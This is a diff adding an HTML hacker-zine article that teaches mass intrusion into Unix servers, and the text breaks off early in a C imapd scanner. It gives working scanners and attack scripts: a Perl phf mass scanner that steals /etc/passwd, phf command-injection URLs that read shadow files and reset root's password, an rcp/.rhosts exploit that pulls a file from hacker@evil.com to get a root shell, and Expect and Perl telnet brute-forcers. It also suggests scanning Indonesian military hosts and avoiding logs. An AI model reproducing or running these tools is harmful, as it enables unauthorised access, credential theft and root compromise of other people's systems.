@@ -1,0 +1,874 @@
+<HTML>
+<HEAD>
+<TITLE>.pt zine - Modern Tecnics or the axing of today</TITLE>
+</HEAD>
+<BODY BGCOLOR="Black" TEXT="#000000" LINK="Green" VLINK="Red">
+<IMG SRC="pt_small.gif" WIDTH=452 HEIGHT=81 BORDER=0>
+<P>
+<FONT SIZE="5" FACE="Arial" COLOR="#FFC639">
+<B>Modern Tecnics or the axing of today:</B><BR>
+------------------------------------------------------ 
+</FONT>
+<BR>
+<FONT SIZE="3" FACE="Arial" COLOR="#FFC639">
+by D00M
+<P>
+<P ALIGN="CENTER">&nbsp;</P>
+<OL>
+
+<LI>Introduction</LI>
+<LI>Disclaimer</LI>
+<LI>Grabing some huge server lists</LI>
+<LI>Mass phf scan</LI>
+<P>- uid (0) responses</P>
+<P>- All other phf query responses</P>
+<LI>Brute force login</LI>
+<P>- Read message files</P>
+<P>- Mass login attempts using finger and shadowed passwd files</P>
+<P>- Using test-cgi to list directories</P>
+<LI>Remote Stuff using info from Mass scans</LI>
+<LI>Greetings</LI></OL>
+
+<B><I><U><P ALIGN="CENTER">Introduction</P></B></I></U>
+<P>Like Bob Dylan said ..&quot;the times there are A changin&quot;…in fact the tecnic is no longer patience and luck ..if you are a Oldie you remember the nights you lost trying to brute force servers sending passwords to the terminal and hoping for a prompt.</P>
+<P>This article is about mass scans probes and mass brute force stuffs…some tecnics are old ..but still some works ok and combined with some new tecnics all you have to do is put the process running on a 24 hours shell…go party all night and when you came back you have plenty of stuff to choose from.</P>
+<P>Let the processor work for you and not your body work for the processor</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<B><I><U><P ALIGN="CENTER">Disclaimer</P>
+</B></I></U><P>I don’t give a damn if you phuck thing up cause im not responsible for what you do ..i’m just here to teach you some tecnics..after that its you own responsibility…be wise and be careful…the guys on the other side are so smart as you..and even the Best Die like the Rest.</P>
+<P>&nbsp;</P>
+<B><I><U><P ALIGN="CENTER">Grabing some huge server lists</P>
+</B></I></U><P>&nbsp;</P>
+<P>Use this shell script to scan for servers in domains and subnets you choose</P>
+<P>&nbsp;</P>
+<P>scanip.sh</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>#!/bin/bash</P>
+<P># make lists of ips from subnets</P>
+<P># Based on tnt imapd scanner code</P>
+<P># Adapted by D00M, Master of Perversion</P>
+<P># use it with sh scanip.sh &lt;domain&gt; or chmod +x scanip.sh</P>
+<P>&nbsp;</P>
+<P>if [ $# != 1 ]</P>
+<P>then</P>
+<P>  echo "Usage:"</P>
+<P>  echo `basename $0`" &lt;domain&gt;"</P>
+<P>  exit</P>
+<P>else</P>
+<P>&nbsp;</P>
+<P>echo "* Scanning domain for hosts."</P>
+<P>host -l $1 | grep "has address" | awk -F ' ' '{ print $4 }' &gt; $1.domains</P>
+<P>echo "* Host scan complete."</P>
+<P>echo "* Sorting hosts and removing dupes."</P>
+<P>sort &lt; $1.domains &gt; $1.sorted</P>
+<P>uniq &lt; $1.sorted &gt; $1.domains</P>
+<P>rm -f $1.sorted</P>
+<P>fi</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>Do a chmod +x scanip.sh or run it with sh scanip.sh &lt;domain&gt; to get a list of ips to scan</P>
+<P>for instance do sh scanip.sh mil.id and you have all register military servers in Indonesia</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<B><I><U><P ALIGN="CENTER">Mass phf scan</P>
+</U><P>&nbsp;</P>
+</B></I><P>Some people say phf is lamme and old…I cant agree with that..cause if used in a case the odds are small but if used in a range of cases the result is great and the potential is huge</P>
+<P>As an example…I scanned a huge list of servers in my home country ..almost all the registed internal primary domains and I’ve got some satisfactory results…servers running http deamons as uid(0) (are you aware of the potentiality) and lots and lots of passwd files</P>
+<P>&nbsp;</P>
+<P>Ok..now for the probe…what you need to run the sucker</P>
+<P>&nbsp;</P>
+<P>1. Perl in the path</P>
+<P>2. Lynx in the path</P>
+<P>3. 256 char filenames ie: (unix or os/2 hpfs)</P>
+<P>4. The source code provided here</P>
+<P>5. A list of Urls..for instance use the one in the Indonesian net exposed article or scan yourself using the shell script above (scanip.sh)</P>
+<P>&nbsp;</P>
+<P>The probe works like this…it reads each of the urls in the url file, opens a lynx section with a phf query asking the deamon the id he runs on…if the uid is 0 he stores the result in a specific file and grab the passwd file in a file url.passwd…if the uid is other he grabs the passwd file..if no response is given he carry on to the following url</P>
+<P>&nbsp;</P>
+<P>The code follows like this:</P>
+<P>&nbsp;</P>
+<P>geturl.pl</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>#!/usr/bin/perl </P>
+<P># </P>
+<P># geturl by Nfin8 / Invisible Evil / D00M Master of Perversion</P>
+<P>#</P>
+<P>#The original code is from Nfin8 and Invisible Evil…I just changed some stuff in the output</P>
+<P>#in order to have more explicit output results</P>
+<P>#</P>
+<P># Format of http://website.dom/cgi-bin/phf?Qalias=x%0a/usr/bin/id </P>
+<P># Format of http://website.dom/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd </P>
+<P># IF result of first command returns an "id=" then check for user. If user</P>
+<P># is not root then execute the 2nd form. </P>
+<P>&nbsp;</P>
+<P># Assign null list to @URLs which will be added to later.</P>
+<P>my(@URLs)=();</P>
+<P>my($program) = "lynx -dump";</P>
+<P>&nbsp;</P>
+<P># Pull off filename from commandline. If it isn't defined, then assign default.</P>
+<P>my($URLfilename) = shift;</P>
+<P>$URLfilename = "urls" if !defined($URLfilename);</P>
+<P>&nbsp;</P>
+<P># Do checking on input.</P>
+<P>die("GetURL: $URLfilename is a directory.\n") if (-d $URLfilename);</P>
+<P> </P>
+<P># Open and read contents of URL file into @URL by line.</P>
+<P>open(FILE, $URLfilename) or die("GetURL: Cannot open $URLfilename for input.\n");</P>
+<P>@URLs = &lt;FILE&gt;;</P>
+<P>close(FILE);</P>
+<P>&nbsp;</P>
+<P># Open output file.</P>
+<P>open(OUTFILE, "&gt;&gt;GetURLResults") or die("GetURL: Cannot open output file.\n");</P>
+<P>open(ROOTFILE, "&gt;&gt;RootURLResults") or die("RootURL: Cannot open root file.\n");</P>
+<P>&nbsp;</P>
+<P>my($url)="";</P>
+<P>foreach $url (@URLs) {</P>
+<P>  print ("Now checking: $url");</P>
+<P>  chomp($url);</P>
+<P>  $result = `$program http://${url}/cgi-bin/phf?Qalias=x%0a/usr/bin/id`;</P>
+<P>  print OUTFILE ("\n============ $url ============\n");</P>
+<P>  foreach (split(/\n/, $result)) {</P>
+<P>    print OUTFILE ("$_\n");</P>
+<P>  }</P>
+<P>  if ($result =~ m/id=/i) {</P>
+<P>    if ($result =~ m/root/i) {</P>
+<P>      print ("Logging root response.\n");</P>
+<P>  &#9;print ROOTFILE ("\n============ $url ============\n");</P>
+<P>  &#9;foreach (split(/\n/, $result)) {</P>
+<P>    &#9;print ROOTFILE ("$_\n");</P>
+<P>&#9;</P>
+<P>&#9;$result = `$program http://${url}/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd`;</P>
+<P>&nbsp;</P>
+<P>&#9;# Output results to file named &lt;domain&gt;.passwd;</P>
+<P>        print ("Getting /etc/passwd.\n");</P>
+<P>      &#9;local($domainfilename)="";</P>
+<P>      &#9;$domainfilename = $url;</P>
+<P>      &#9;if (open(PASSWDFILE, "&gt;${domainfilename}.passwd")) {</P>
+<P>        &#9;print PASSWDFILE ("\n");</P>
+<P>        &#9;foreach (split(/\n/, $result)) {</P>
+<P>          &#9;print PASSWDFILE ("$_\n");</P>
+<P>&#9;&#9;}</P>
+<P>        &#9;close(PASSWDFILE);</P>
+<P>        &#9;print ("Done! [$domainfilename].\n");</P>
+<P>      &#9;} else {</P>
+<P>        &#9;print ("FAILED! [$domainfilename].\n");</P>
+<P>      }   </P>
+<P>     }</P>
+<P>    } else {</P>
+<P>      print ("Got ID response.\n");</P>
+<P>      $result = `$program http://${url}/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd`;</P>
+<P>      </P>
+<P>      # Output results to file named &lt;domain&gt;.passwd;</P>
+<P>      print ("Getting /etc/passwd.\n");</P>
+<P>      local($domainfilename)="";</P>
+<P>      $domainfilename = $url;</P>
+<P>      if (open(PASSWDFILE, "&gt;${domainfilename}.passwd")) {</P>
+<P>        print PASSWDFILE ("\n");</P>
+<P>        foreach (split(/\n/, $result)) {</P>
+<P>          print PASSWDFILE ("$_\n");</P>
+<P>        }</P>
+<P>        close(PASSWDFILE);</P>
+<P>        print ("Done! [$domainfilename].\n");</P>
+<P>      } else {</P>
+<P>        print ("FAILED! [$domainfilename].\n");</P>
+<P>      }</P>
+<P>    }</P>
+<P>  }</P>
+<P>}</P>
+<P>  </P>
+<P># We are done. Close the output file and end the program.</P>
+<P>close (OUTFILE);</P>
+<P>close (ROOTFILE);</P>
+<P>&nbsp;</P>
+<P>0;</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>Using the probe is so simple as that..cut and paste it in a unix shell…chmod +x on the file and run it like geturl &lt;url-list&gt;</P>
+<P>A little advice for the masses…phf querys in some cases make logs of your presence ..so if you wanna do this mass thing use other than your own sistem..*Grin*</P>
+<P>After that you should get three type of outputs:</P>
+<P>1. GeturlResults…the file that stores ALL the responses from the servers…you dont need this..its only there so that you can verify the servers that by that time were down and didn’t answer to your request…you can try them latter</P>
+<P>2. RootURLResults..the file that stores all the urls that respond to your id query with uid(0)..(not so many as you can suppose …I got 3 in my home country scan)</P>
+<P>3. Some files with the following format url.passwd..each of this files is the /etc/passwd file of the specific url</P>
+<P>&nbsp;</P>
+<P>Now that the scan is done lets get to work</P>
+<P>&nbsp;</P>
+<B><P>- uid (0) responses</P>
+<P>&nbsp;</P>
+</B><P>If you got some uid 0 responses it means all queries sent to the server have root permissions</P>
+<P>If you know some unix commands use them to get a shell prompt ..im not here to teach you that..but heres some nice things to do</P>
+<P>first learn the phf query format…its like this http://www.victim.com/cgi-bin/phf?Qalias=x%0a after that put the unix command you like…phf queries doesn’t understand space character ..so use %20 instead ..here some examples of what you can do</P>
+<P>&nbsp;</P>
+<P>List root directory</P>
+<P>http://www.victim.com/cgi-bin/phf?Qalias=x%0als%20-alg%20/root</P>
+<P>Get inside as root</P>
+<P>&#9;First backup passwd file</P>
+<P>http://www.victim.com/cgi-bin/phf?Qalias=x%0acp%20/etc/passwd%20/etc/passwd.my</P>
+<P>&#9;Then change root’s passwd to nopasswd (if the server lets you)</P>
+<P>http://www.victim.com/cgi-bin/phf?Qalias=x%0apasswd%20root</P>
+<P>Then telnet to the victim.com…login as root and do what you need to grab root..but dont</P><DIR>
+<DIR>
+
+<P>forget once inside to do a mv passwd.my passwd</P>
+<P>Grab shadow passwd (do some ls cause shadow can be anywhere ..here some default stuff)</P>
+<P>On BSDi and FreeBSD</P>
+<P>http://www.victim.com/cgi-bin/phf?Qalias=x%0acat%20/etc/master.passwd</P>
+<P>On Linux boxes</P>
+<P>http://www.victim.com/cgi-bin/phf?Qalias=x%0acat%20/etc/shadow</P>
+<P>On AIX</P>
+<P>http://www.victim.com/cgi-bin/phf?Qalias=x%0acat%20/etc/security/passwd</P>
+<P>&nbsp;</P>
+<P>Well..the potential are enormous..I wont go any further</P>
+<P>&nbsp;</P></DIR>
+</DIR>
+
+<B><P>- All other phf query responses</P>
+</B><P>&nbsp;</P>
+<P>Well in almost cases what you get as response is the passwd file..some are plain passwd files and some are shadowed …the shadowed ones I will talk latter ..the plain passwd file use for instance john to crack some accounts and once inside read some stuffs on exploits and other tecnics to grab root</P>
+<P>&nbsp;</P>
+<P>If you got some uid answers 65535 user nobody, root privileges can be obtained by exploiting a problem with /usr/bin/rcp. Many applications are running as ‘nobody’, in particular the NCSA httpd server, which by default executes all cgi-bin scripts under this uid. This exploits was tested on Linux Red Hat 4.0 and Linux Slackware 3.1.</P>
+<P>You need a shell account on a unix box and netcat installed… <A HREF="nc110.zip">nc</A> is a very important axing tool. I included the zipped file in this zine,  put the file in your shell and then gzip -d &lt;file&gt; , tar -xvf &lt;file&gt; and finally do a make to the system your using</P>
+<P>&nbsp;</P>
+<P>The exploit works as follows:</P>
+<P>&nbsp;</P>
+<P>$ echo "+ +" &gt; /tmp/my.rhosts</P>
+<P>$ echo "GET /cgi-bin/phf?Qalias=x%0arcp+hacker@evil.com:/tmp/my.rhosts+ /root/.rhosts" | nc -v - 20 victim.com 80</P>
+<P>$ rsh -l root victim.com "/bin/sh -i"</P>
+<P>#</P>
+<P>&nbsp;</P>
+<P>What it does is create a temporary rhost file on your system ..rcp it to the victim.com root directory as the new .rhosts file…and then calls a remote shell with root permission using rsh…if it works a # on the victims server will be gained ..otherwise a &quot;no permission&quot; message will appear</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<B><I><U><P ALIGN="CENTER">Brute force login</P>
+</U><P>&nbsp;</P>
+</B></I><P>This section is some tecnics on getting inside the system by brute forcing a login prompt using some of the outputs of the last section, and some new or not so new vulnerabilities</P>
+<P>&nbsp;</P>
+<B><P>- Read message files</P>
+</B><P>&nbsp;</P>
+<P>On most systems all connections are recorded in files called message ..sometimes when you do a telnet to a sistem you do it so fast or the sistem is so slow that instead of typing your login when asked you type your passwd..if you can read this files remotely…and in most cases you can…here’s a vulnerability we can use..lets see how:</P>
+<P>First lets see the Login Error messages</P>
+<P>Do this on your browser</P>
+<P>http://www.victim.com/cgi-bin/phf?Qalias=x%0acat%20/var/log/message</P>
+<P>you’ll get a print of a big file on your screen…now browse it and look for &quot;LOGIN FAILURE&quot; messages…when you find one write the login that was typed..do this to the all file and dont forget to do a http://www.victim.com/cgi-bin/phf?Qalias=x%0als%20-alg%20/var/log to list the all dir and see if there’s more messages files ..cause the older messages files are backed up to messages.0 and so on</P>
+<P>When you finished you should have a list of words to use on john or your custom cracker ..crack the passwd files you got bellow and with luck some of the login failures are passwd…even root’s passwd could be there</P>
+<P>If the system is shadows but still you can read the message files you can try brute force login with the LOGIN FAILURE words you got…look in the timestamps …if a user gets a LOGIN FAILURE and then logins as &quot;mrX&quot; maybe…maybe..the erroneous login could be &quot;mrX&quot; passwd…its a question of persistence and luck…but still…it works fine most of the time</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<B><P>- Mass login attempts using finger and shadowed passwd files</P>
+</B><P>&nbsp;</P>
+<P>Some other possibility to break in the system is use a mass probe to try lots of logins passwds till it finds a valid account on the system.</P>
+<P>You can use the info you want but I advice you to get the most info you can on the system ..cause in a system with lots of user accounts many tend to use as passwd the login or parts of his real name.</P>
+<P>In this section we can use the shadowed passwd files that you caught with our probe ..the other way is..if the system has finger open do mass fingers to the system and with the info we get try it as passwd.. you only use finger when we dont have info on the user list inside the server</P>
+<P>To use this probe you need a script language called expect…use the file
+<A HREF="ex-512.zip">ex-512.zip</A> included here  and then follow the instructions on the installation readme file..its simple..but by default the archive is prepared to unzip on /usr/bin and /usr/lib..if you dont have root in your system you have to change the header on the script and put the exact location of the binary</P>
+<P>Other thing I advice you to change if you’re using the probe to do mass fingers is the finger names ..put on some common user names of the country you’re scanning ..cause by default it uses English names</P>
+<P>If you are using the shadowed passwd files that you got with the geturl script don’t do nothing cause the finger part is skipped</P>
+<P>the code follows like this:</P>
+<P>&nbsp;</P>
+<P>login.exp</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>#!/usr/bin/expect --</P>
+<P>&nbsp;</P>
+<P>set host [lindex $argv 0]        ;# host is taken from the command line</P>
+<P>set account [lindex $argv 1]     ;# ditto the account name</P>
+<P>set pw [lrange $argv 2 end]      ;# the rest are potential passwords</P>
+<P>set timeout 60</P>
+<P>&nbsp;</P>
+<P>foreach password $pw {</P>
+<P>   puts "\n\nExpect: using $account $password -----------------------------"</P>
+<P>   spawn telnet $host</P>
+<P>   expect "ogin:"</P>
+<P>   send "$account\r"</P>
+<P>   expect "assword:"</P>
+<P>   send "$password\r"</P>
+<P>   expect {</P>
+<P>      # we look for the "Last login" message or shell prompts</P>
+<P>      "ast login" {</P>
+<P>         puts "LOGGED INTO $host $account $password"</P>
+<P>         send "exit\r";</P>
+<P>      }</P>
+<P>      "#$" {</P>
+<P>         puts "LOGGED INTO $host $account $password"</P>
+<P>         send "exit\r";</P>
+<P>      }</P>
+<P>      "%$" {</P>
+<P>         puts "LOGGED INTO $host $account $password"</P>
+<P>         send "exit\r";</P>
+<P>      }</P>
+<P>      "\$$" {</P>
+<P>         puts "LOGGED INTO $host $account $password"</P>
+<P>         send "exit\r";</P>
+<P>      }</P>
+<P>      # otherwise bail out</P>
+<P>      "incorrect" close</P>
+<P>      "invalid" close</P>
+<P>   }</P>
+<P>}</P>
+<P>exit</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>&nbsp;</P>
+<P>mf.pl</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>#!/usr/bin/perl</P>
+<P>&nbsp;</P>
+<P># 'middlefinger'</P>
+<P># Finger a remote host, collect accounts and names.</P>
+<P># or use provided passwd file</P>
+<P># Use that data to attempt to login.</P>
+<P>&nbsp;</P>
+<P>$max = 15;</P>
+<P>$host = $passwdfile = $debug = $pwlist = 0;</P>
+<P>&amp;parser(); # parse command line</P>
+<P>die "Usage: mf.pl [-h&lt;remote host&gt;] [-f&lt;passwdfile&gt;] [-l&lt;password list&gt;] [-d]\n" unless $host;</P>
+<P>&nbsp;</P>
+<P>&amp;banner();</P>
+<P>&nbsp;</P>
+<P># Names to finger. This can obviously be expanded.</P>
+<P>@names = qw/mike steve michael mark tim susan cheryl laura john william</P>
+<P>bill jill sue chris adam kathy cathy rebecca joseph joe frank tracy tammy</P>
+<P>christopher alan edward shelly emily carrie terry carol caroline paul</P>
+<P>brian tom thomas heather becky barbara barb todd ron ronald</P>
+<P>david sharon harold frank benjamin jean gene lisa lee anthony/;</P>
+<P>&nbsp;</P>
+<P># Collect account data</P>
+<P>if ($passwdfile) {</P>
+<P>   open FILE, "$passwdfile" or die "Can't open $passwdfile: $!\n";</P>
+<P>   @accountdata = &lt;FILE&gt;;</P>
+<P>   close FILE;</P>
+<P>&nbsp;</P>
+<P>   &amp;refine_passwdfile_data();</P>
+<P>&nbsp;</P>
+<P>} else {</P>
+<P>   # finger the remote for info</P>
+<P>   foreach $name (@names) {</P>
+<P>      print "Trying $name...\n" if $debug;</P>
+<P>      open PIPE, "finger -l $name\@$host|"</P>
+<P>         or die "No finger $name\@$host: $!\n";</P>
+<P>      @accountdata = (@accountdata, &lt;PIPE&gt;);</P>
+<P>      close PIPE;</P>
+<P>   }</P>
+<P>&nbsp;</P>
+<P>   print "Refining finger data\n" if $debug;</P>
+<P>   &amp;refine_finger_data();</P>
+<P>&nbsp;</P>
+<P>}</P>
+<P>&nbsp;</P>
+<P># Break the list of accounts into smaller arrays, set by the</P>
+<P># variable $max. We want to run a certain number of simultaneous</P>
+<P># shells, but we don't want to max out the ports on the other end</P>
+<P># or hose the connection too bad.</P>
+<P>&nbsp;</P>
+<P>@keys = sort keys %hash;</P>
+<P>$index = int($#keys / $max); # for stepping through the array @keys</P>
+<P>&nbsp;</P>
+<P>for ('0' .. $index) {</P>
+<P>   @buffer = splice(@keys, 0, $max);</P>
+<P>#   print "buffer: @buffer \nlength: $#keys\n";</P>
+<P>&nbsp;</P>
+<P>   &amp;try_to_login(@buffer);</P>
+<P>}</P>
+<P>&nbsp;</P>
+<P>print "\nDone. Exiting...\n";</P>
+<P>&nbsp;</P>
+<P>###</P>
+<P>###  Subroutines</P>
+<P>###</P>
+<P>&nbsp;</P>
+<P># Attempt to login with each account</P>
+<P>sub try_to_login {</P>
+<P>&nbsp;</P>
+<P>   my $account = shift;</P>
+<P>   return unless $account;</P>
+<P>   $level++;</P>
+<P>   my $pipe = "PIPE$level";</P>
+<P>&nbsp;</P>
+<P>   open $pipe, "login.exp $host $account @{$hash{$account}}|"</P>
+<P>      or warn "No pipe to telnet: $!\n";</P>
+<P>&nbsp;</P>
+<P>   &amp;try_to_login(@_); # recurse</P>
+<P>&nbsp;</P>
+<P>   print "\n=====================================================\n";</P>
+<P>   print "Trying ACCOUNT: $account PASSWORDS: @{$hash{$account}}\n";</P>
+<P>   my @lines = &lt;$pipe&gt;;</P>
+<P>   close $pipe;</P>
+<P>   print "@lines";</P>
+<P>   print "\n=====\n";</P>
+<P>&nbsp;</P>
+<P>}</P>
+<P>&nbsp;</P>
+<P># filter out potential nonpasswords</P>
+<P>sub pw_filter {</P>
+<P>   my %pws;</P>
+<P>   my (@list) = @_;</P>
+<P>   print "List: @list\n" if $debug;</P>
+<P>   if ($passwdfile) {</P>
+<P>      for (@list) {</P>
+<P>         unless (length($_) &lt; 5) {</P>
+<P>            s/[()']//g;</P>
+<P>            $pws{$_}++;</P>
+<P>            if (length($_) == 5) { $pws{"${_}1"} = "${_}1"; }</P>
+<P>         }</P>
+<P>      }</P>
+<P>   } else {</P>
+<P>      # process finger data</P>
+<P>      for (@list) {</P>
+<P>    unless ($_ =~ /login|login:|name:|name|in|real|life/i || length($_) &lt; 5) {</P>
+<P>            s/[()']//g;</P>
+<P>            $pws{$_}++;</P>
+<P>            if (length($_) == 5) { $pws{"${_}1"} = "${_}1"; }</P>
+<P>         }</P>
+<P>      }</P>
+<P>   }</P>
+<P>   print "returning ", join(' ', keys %pws), "\n" if $debug;</P>
+<P>   return keys %pws;</P>
+<P>}</P>
+<P>&nbsp;</P>
+<P># parse the command line</P>
+<P>sub parser {</P>
+<P>   for (@ARGV) {</P>
+<P>      /^-h/ &amp;&amp; do { $host = $';   next; };</P>
+<P>      /^-f/ &amp;&amp; do { $passwdfile = $'; next; };</P>
+<P>      /^-d/ &amp;&amp; do { $debug = 1;   next; };</P>
+<P>      /^-l/ &amp;&amp; do { $pwlist = $'; next; };</P>
+<P>   }</P>
+<P>}</P>
+<P>&nbsp;</P>
+<P># Refine finger data</P>
+<P>sub refine_finger_data {</P>
+<P>&nbsp;</P>
+<P>   @logins = grep /Login/, @accountdata;</P>
+<P>   chomp @logins;</P>
+<P>   # Dumb kludge. "@logins = grep /[^?]$/, @logins;" doesn't work.</P>
+<P>   for (@logins) {</P>
+<P>      /.$/;</P>
+<P>      if ($&amp; eq '?') { undef $_; }</P>
+<P>   }</P>
+<P>&nbsp;</P>
+<P>   print "filtered logins:\n", join("\n", @logins);</P>
+<P>&nbsp;</P>
+<P>   $results = @logins;</P>
+<P>   die "Insufficient account data\n" unless $results;</P>
+<P>&nbsp;</P>
+<P>   # Store login data into data structure</P>
+<P>   for (@logins) {</P>
+<P>      tr/[A-Z]/[a-z]/;</P>
+<P>      s/(\s)+/ /g;</P>
+<P>      print "\n\nDespaced: $_\n" if $debug;</P>
+<P>      @a = split(/ /);</P>
+<P>      print "pw_filter: ", join(' ', &amp;pw_filter(@a)), "\n" if $debug;</P>
+<P>      # toggle this depending on finger's output</P>
+<P>      $login = $a[2]; #                                  &lt;----- TOGGLE!</P>
+<P>      $hash{$login} = [ &amp;pw_filter(@a) ];</P>
+<P>      print "Data: account-&gt; $login, pws-&gt; @{$hash{$login}}\n\n" if $debug;</P>
+<P>   }</P>
+<P>&nbsp;</P>
+<P>}</P>
+<P>&nbsp;</P>
+<P>sub refine_passwdfile_data {</P>
+<P>   for (@accountdata) {</P>
+<P>      @fields = split(/:/);</P>
+<P>      @namedata = split(/,/, $fields[4]);</P>
+<P>      print "pwdata: $fields[0] $namedata[0]\n" if $debug;</P>
+<P>      $login = $fields[0];</P>
+<P>      $namedata[0] =~ tr/A-Z/a-z/;</P>
+<P>      @a = split(/ /, $namedata[0]);</P>
+<P>      print "pw_filter: ", join(' ', &amp;pw_filter(@a)), "\n" if $debug;</P>
+<P>      $hash{$login} = [ &amp;pw_filter($login, @a) ];</P>
+<P>      print "Data: account-&gt; $login, pws-&gt; @{$hash{$login}}\n\n" if $debug;</P>
+<P>   }</P>
+<P>}</P>
+<P>&nbsp;</P>
+<P>sub banner {</P>
+<P>print &lt;&lt; "EOLN";</P>
+<P>&nbsp;</P>
+<P>                               Middle Finger</P>
+<P>                     Copyleft (C)1997 Americrack Inc.</P>
+<P>                   "Your Link to Illegal Communications"</P>
+<P>&nbsp;</P>
+<P>EOLN</P>
+<P>}</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>&nbsp;</P>
+<P>To use the probe just cut and past the login.exp part and put it in your shell…then cut and past mf.pl and chmod +x on the script ..login.exp subroutine is called inside mf.pl so dont use other name than that</P>
+<P>to use it on a shadowed passwd file do mf.pl -hvictim.com -fshadowfile -lpasswdlistname -d..if the shadowed file exist the probe creates a passwdlist and then do a mass telnet using the list..else if dont it starts fingering the machine in order to create the passwd list and finally do the mass telnet stuff</P>
+<P>If everything is done well you should now have a valid account on the system and you’re ready to axe the mothaphucker..*Grin*</P>
+<P>&nbsp;</P>
+<B><P>- Using test-cgi to list directories</P>
+</B><P>&nbsp;</P>
+<P>If the machine doesnt have phf…doesnt have finger port open..well…bad luck..you cant use none of the above..so try other approach ..this is one of the possibilities ..test-cgi</P>
+<P>Basically test-cgi is a cgi-bin query script that if working on a server can be used to list directories ..whats the point of listing directories? ..well..try listing /home dir and you get all the users on the system..after that try your luck doing brute force, login equal to passwd..in most cases you get at least an account inside</P>
+<P>the vulnerability works like this, first test if cgi-bin is there doing</P>
+<P>machine% echo "GET /cgi-bin/test-cgi?/*" | nc www.victim.com 80</P>
+<P>And if so you’ll get a output on your browser similar to this:</P>
+<P>&nbsp;</P>
+<P>CGI/1.0 test script report:</P>
+<P>&nbsp;</P>
+<P>argc is 1. argv is /\*.</P>
+<P>&nbsp;</P>
+<P>SERVER_SOFTWARE = NCSA/1.4.1</P>
+<P>SERVER_NAME = www.victim.com</P>
+<P>GATEWAY_INTERFACE = CGI/1.1</P>
+<P>SERVER_PROTOCOL = HTTP/0.9</P>
+<P>SERVER_PORT = 80</P>
+<P>REQUEST_METHOD = GET</P>
+<P>HTTP_ACCEPT =</P>
+<P>PATH_INFO =</P>
+<P>PATH_TRANSLATED =</P>
+<P>SCRIPT_NAME = /bin/cgi-bin/test-cgi</P>
+<P>QUERY_STRING = /a /bin /boot /bsd /cdrom /dev /etc /home /lib /mnt</P>
+<P>/root /sbin /stand /sys /tmp /usr /usr2 /var</P>
+<P>REMOTE_HOST = remote.machine.com</P>
+<P>REMOTE_ADDR = 255.255.255.255</P>
+<P>REMOTE_USER =</P>
+<P>AUTH_TYPE =</P>
+<P>CONTENT_TYPE =</P>
+<P>CONTENT_LENGTH =</P>
+<P>&nbsp;</P>
+<P>then to browse the /home dir do </P>
+<P>machine% echo "GET /cgi-bin/test-cgi?/home/*" | nc www.victim.com 80</P>
+<P>&nbsp;</P>
+<P>and voila..you get a output like this and lots of logins to test</P>
+<P>&nbsp;</P>
+<P>CGI/1.0 test script report:</P>
+<P>&nbsp;</P>
+<P>argc is 1. argv is /\*.</P>
+<P>&nbsp;</P>
+<P>SERVER_SOFTWARE = NCSA/1.4.1</P>
+<P>SERVER_NAME = www.victim.com</P>
+<P>GATEWAY_INTERFACE = CGI/1.1</P>
+<P>SERVER_PROTOCOL = HTTP/0.9</P>
+<P>SERVER_PORT = 80</P>
+<P>REQUEST_METHOD = GET</P>
+<P>HTTP_ACCEPT =</P>
+<P>PATH_INFO =</P>
+<P>PATH_TRANSLATED =</P>
+<P>SCRIPT_NAME = /bin/cgi-bin/test-cgi</P>
+<P>QUERY_STRING = /ze /manel /pedro /antonio /maria /joana /manuela /francisco /toze /paco</P>
+<P>/nassa </P>
+<P>REMOTE_HOST = remote.machine.com</P>
+<P>REMOTE_ADDR = 255.255.255.255</P>
+<P>REMOTE_USER =</P>
+<P>AUTH_TYPE =</P>
+<P>CONTENT_TYPE =</P>
+<P>CONTENT_LENGTH =</P>
+<P>&nbsp;</P>
+<P>For now you have to do this test one by one..but if you know a bit of perl you can modify the mf.pl script to do mass test-cgi…just add a line to the script doing the test-cgi home dir capture ..then change the lines where it works the finger info to create the passwdlist…you just need to put there the format sent by the test-cgi query…its not difficult ..and if I have time I’ll do that and post it in the next number</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<B><I><U><P ALIGN="CENTER">Remote Stuff using info from Mass scans</P>
+</B></I></U><P>&nbsp;</P>
+<P>To finish this article here is another way to get in..this time without any brute force login or passwd crack..if you get in this way..root owns you..*Grin*</P>
+<P>I will talk only about remote imapd buffer overflow exploit…but there’s more..just imapd cause the idea is not the remote itself but the source code to scan for 143 port open servers (imapd)</P>
+<P>The other pop3 and ncsa remote are very similar in how to use..the only difference is the port you put in the command line..110 for pop3 and 80 for ncsa and the offsets to look for..but still both are old exploits and recent versions are patched.</P>
+<P>The other remote is samba…its recent and works fine..in future editions I suppose someone will say something about</P>
+<P>&nbsp;</P>
+<P>the code follows like this:</P>
+<P>&nbsp;</P>
+<P>imapdscan.c</P>
+<P>------------------------------------------Cut here-----------------------------------------------------</P>
+<P>/*******************************************************************/</P>
+<P>/* ADM imapd scanner the BEST of §THE WORLD ! Make  by DA ADM crew */    </P>
+<P>/* he needs the output of a host -l target &gt;filez  for   run       */</P>
+<P>/* USAGE is SIMPLE !  ADMimap &lt;host filz&gt; &lt;your ipZ&gt; &lt;delay&gt;       */</P>
+<P>/*******************************************************************/</P>
+<P>/* VERSION:  1.1                                                   */</P>
+<P>/* CoDeuRz:  a  CoDeuRz of ADM                                     */</P>
+<P>/* Greeeetzzzzzz: ADM &amp; HeiKe &amp; some guyz on ***.*******.***       */</P>
+<P>/*******************************************************************/</P>
+<P> </P>
+<P>#include &lt;stdio.h&gt;</P>
+<P>#include &lt;signal.h&gt;</P>
+<P>#include &lt;netdb.h&gt;</P>
+<P>#include &lt;sys/types.h&gt;</P>
+<P>#include &lt;sys/socket.h&gt;</P>
